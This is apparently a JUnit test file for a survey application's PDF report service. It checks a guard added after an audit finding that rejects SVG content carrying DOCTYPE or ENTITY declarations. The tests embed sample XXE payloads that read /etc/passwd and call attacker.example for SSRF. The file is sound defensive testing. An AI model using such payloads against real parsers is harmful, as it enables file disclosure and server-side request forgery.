package com.elicitsoftware.report;

/*-
 * ***LICENSE_START***
 * Elicit Survey
 * %%
 * Copyright (C) 2025 The Regents of the University of Michigan - Rogel Cancer Center
 * %%
 * PolyForm Noncommercial License 1.0.0
 * <https://polyformproject.org/licenses/noncommercial/1.0.0>
 * ***LICENSE_END***
 */

import org.junit.jupiter.api.Test;

import java.io.IOException;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;

/**
 * Tests for {@link PDFService#rejectXxePayload(String)}.
 *
 * <p>Traceability: UC-005 (Generate and Download Survey Report). 2026-09 audit finding #8:
 * {@code addSVG()} parses SVG returned by an admin-configured, DB-stored, arbitrary
 * report-service URL ({@code ReportDefinition.url}) via Batik's {@code SAXSVGDocumentFactory},
 * which does not disable external-entity/DOCTYPE resolution by default. This guard rejects
 * any DOCTYPE/ENTITY declaration before Batik ever sees the content, closing the XXE/SSRF
 * path without needing to depend on Batik-internal SAX feature configuration.</p>
 */
class PDFServiceXxeTest {

    /** #8: a legitimate SVG with no DOCTYPE/ENTITY passes through untouched. */
    @Test
    void legitimateSvgIsAccepted() {
        String svg = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"10\" height=\"10\">"
                + "<rect width=\"10\" height=\"10\"/></svg>";
        assertDoesNotThrow(() -> PDFService.rejectXxePayload(svg));
    }

    /** #8: a DOCTYPE declaration (classic XXE vector) is rejected. */
    @Test
    void doctypeDeclarationIsRejected() {
        String malicious = "<?xml version=\"1.0\"?>"
                + "<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
                + "<svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>";
        assertThrows(IOException.class, () -> PDFService.rejectXxePayload(malicious));
    }

    /** #8: a bare ENTITY declaration without a DOCTYPE wrapper is also rejected. */
    @Test
    void entityDeclarationIsRejected() {
        String malicious = "<svg><!ENTITY xxe SYSTEM \"http://attacker.example/ssrf\"></svg>";
        assertThrows(IOException.class, () -> PDFService.rejectXxePayload(malicious));
    }

    /** #8: the check is case-insensitive. */
    @Test
    void rejectionIsCaseInsensitive() {
        String malicious = "<!doctype svg [<!entity xxe SYSTEM \"file:///etc/passwd\">]><svg/>";
        assertThrows(IOException.class, () -> PDFService.rejectXxePayload(malicious));
    }

    /** Null content (no SVG to render) is not itself treated as malicious. */
    @Test
    void nullContentDoesNotThrow() {
        assertDoesNotThrow(() -> PDFService.rejectXxePayload(null));
    }
}
